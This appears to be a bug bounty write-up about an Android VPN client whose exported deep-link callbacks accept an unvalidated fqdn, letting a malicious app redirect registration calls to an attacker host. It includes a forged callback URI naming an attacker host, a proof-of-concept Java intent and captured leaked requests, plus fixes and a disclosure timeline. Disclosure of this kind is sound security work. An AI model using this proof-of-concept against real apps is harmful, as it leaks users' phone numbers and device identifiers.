# Hijacking Your VPN with one Deep Link

- **Source URL:** https://medium.com/@husein.ayoub/hijacking-your-vpn-with-one-deep-link-3ce9ca778306
- **Fetched from:** https://medium.com/@husein.ayoub/hijacking-your-vpn-with-one-deep-link-3ce9ca778306?source=rss-66c1c114eefc------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14933 (id 14933)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** Hussein Ayoub / Sun, 04 Oct 2026 21:14:27 GMT

This is a write-up of a vulnerability I reported to a private bug bounty program. The target is a carrier-grade mobile VPN / secure-access client.

During the short window where the app is waiting for an OAuth login to complete, a malicious app sitting on the same device can hand it a different backend, and the VPN client happily starts sending its device-registration API calls there, which was caused by an unvalidated fqdn parameter on an exported deep-link callback and led to potentially leaking the user's phone number, MAC address, device GUID, and more*.*

Nothing exotic. Pull the APK, decompile with jadx for readable Java and apktool for the manifest and resources, then run an LLM-assisted pass over the output to surface the components worth reading by hand before I read anything myself.

For deep-link bugs the things I want flagged are cheap to express:

The pass flagged two exported activities that both read a fqdn query parameter off the incoming URI and fed it into the client's registration base URL. That combination is where the human work started.

The app declared two callback activities, both exported, both reachable by any other app:

Their job is legitimate. After the user authenticates in a browser tab, the web flow redirects back into the app through one of these deep links, and the callback carries parameters telling the client how to finish setting itself up. One of those parameters is fqdn: the hostname of the backend the client should register against.

The problem is that the callback accepts fqdn from whoever sends the intent, with no validation that:

So any app on the device can forge the callback and supply its own fqdn.

Reconstructed, the deep link the app is willing to accept looks like this:

vpnclient://callback?vpnEnabled=true&advancedMode=false&fqdn=\<ATTACKER\_HOST>&tenant=\<...>&userId=\<...>

\<ATTACKER\_HOST> is a domain I control. There is no allowlist check against it, and no binding to the originating request. The client takes that hostname and uses it as the base for its registration API calls.

There is one timing condition, and it is generous. The redirect-back is only accepted during the login window, roughly **180 seconds** after the user taps login and the browser tab opens. That sounds like it would make exploitation fiddly. It does not.

A malicious app can watch for the moment the user starts a login (the browser tab opening is observable) and fire the forged callback immediately, well inside the window. From the user’s point of view nothing unusual happens. They log in like they always do.

The PoC app is a plain activity with a couple of buttons. Its manifest requests a single permission, INTERNET, and nothing security-sensitive. No root, no accessibility service, no notification access.

\<manifest xmlns:android="http://schemas.android.com/apk/res/android">

\<uses-permission android:name="android.permission.INTERNET" />

\<application android:label="VPN Callback PoC">

\<activity android:name=".MainActivity" android:exported="true">

\<intent-filter>

\<action android:name="android.intent.action.MAIN" />

\<category android:name="android.intent.category.LAUNCHER" />

\</intent-filter>

\</activity>

\</application>

\</manifest>

Firing the forged callback is a handful of lines. Build the URI with my own fqdn, mark it BROWSABLE so it looks like a normal web redirect, and target the exported callback component directly:

```
Uri uri = Uri.parse("vpnclient://callback?vpnEnabled=true"
        + "&advancedMode=false"
        + "&fqdn="   + Uri.encode(attackerHost)   // my server
        + "&tenant=" + Uri.encode(tenant)
        + "&userId=" + Uri.encode(userId));
Intent intent = new Intent(Intent.ACTION_VIEW, uri);
intent.addCategory(Intent.CATEGORY_BROWSABLE);
intent.setComponent(new ComponentName(
        "com.vendor.vpnclient",
        "com.vendor.vpnclient.ui.WebLoginCallbackActivity"));
startActivity(intent);
```
The second exported activity (WebCallbackHandlerActivity) accepts a slightly richer URI with an extra backend-host parameter, and works the same way. Two doors into the same room.

I pointed fqdn at an interactsh instance. Within the login window, two HTTPS requests from the victim device landed on my server:

GET /portal/services?action=discover&username=\<phone>&device\_mac=\<mac>&guid=\<guid>...

GET /portal/services?action=preregister&username=\<phone>&device\_mac=\<mac>&private\_ip=\<ip>...

The client had accepted my hostname as its backend and started its registration handshake against it.

Everything the client sends during registration, sent to me instead of the real backend:

That is a precise, stable fingerprint of a person and their device, tied to their phone number, handed over with no interaction beyond the login they were already doing.

Three things make this worse than a generic info leak:

Two changes, both small, and you want both:

**Bind the callback to the request that started it.** When the app kicks off the login, generate a one-time, unguessable state token, keep it in memory, and refuse any callback that does not echo it back. This alone kills the forged-intent path, because the attacker’s app cannot know the token.

**Validate** fqdn **against a server-side allowlist.** The set of backends this client is ever allowed to talk to is small and known. Check the incoming hostname against it (exact match or a real suffix match, not a substring check) and reject anything else. Never let an inbound parameter freely choose the control-plane host.

11/Aug/26 -> Reported

12/Aug/26 -> Acknowledged and triaged

30/Sep/26 -> Fixed and validated

01/Oct/26 -> Rewarded
